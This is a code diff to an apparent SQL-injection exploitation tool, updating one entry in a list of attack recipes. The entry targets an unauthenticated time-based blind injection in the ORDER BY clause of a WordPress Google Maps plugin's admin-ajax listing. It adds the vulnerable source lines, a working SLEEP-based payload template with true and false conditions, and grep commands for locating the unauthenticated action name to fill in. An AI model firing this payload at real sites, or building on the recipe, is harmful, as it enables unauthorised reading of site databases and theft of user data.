@@ -106,20 +106,25 @@ SQLI_RECIPES = [
         "kind": "time-blind",
         "method": "GET",
         "endpoint": "/wp-admin/admin-ajax.php",
-        # The 'orderby' sink is the AJAX tabular/location listing
-        # (class.tabular.php). Wordfence/WPScan don't publish the exact nopriv
-        # action string; CONFIRM it against the installed plugin source, e.g.
-        #   grep -rn "wp_ajax_nopriv_" wp-content/plugins/wp-google-map-plugin/
-        #   grep -rn "orderby" .../class.tabular.php
-        # The value below is a placeholder to be replaced with the real action.
+        # Sink CONFIRMED from source (core/class.tabular.php::prepare_items):
+        #     $orderby = $_GET['orderby'] ?: $this->primary_col;
+        #     $order   = $_GET['order']   ?: 'asc';
+        #     $query  .= " order by {$orderby} {$order}";   // BOTH interpolated raw
+        # So 'orderby' AND 'order' are injectable ORDER BY-context params (GET).
+        # The vulnerable *frontend* trigger lives in the 4.9.x DataTables listing,
+        # which isn't in the public wp.org mirror — the exact nopriv action must
+        # come from the installed 4.9.x copy:
+        #     grep -rn "wp_ajax_nopriv" wp-content/plugins/wp-google-map-plugin/
+        # Replace the placeholder action below with what that prints.
         "params": {"action": "CONFIRM_nopriv_listing_action"},
-        "inject_param": "orderby",
+        "inject_param": "orderby",       # 'order' is a second raw sink (fallback)
         "payload": "title,(SELECT CASE WHEN ({cond}) THEN SLEEP({sleep}) ELSE 0 END)",
         "true_cond": "1=1",
         "false_cond": "1=2",
         "source": "registry",
-        "note": "Unauth time-based blind SQLi via orderby in the datatables "
-                "listing; confirm the admin-ajax action against plugin source.",
+        "note": "Unauth time-based blind SQLi; ORDER BY sink confirmed in "
+                "class.tabular.php (orderby+order, GET). Fill the real nopriv "
+                "action from the installed 4.9.x copy.",
     },
 ]
 
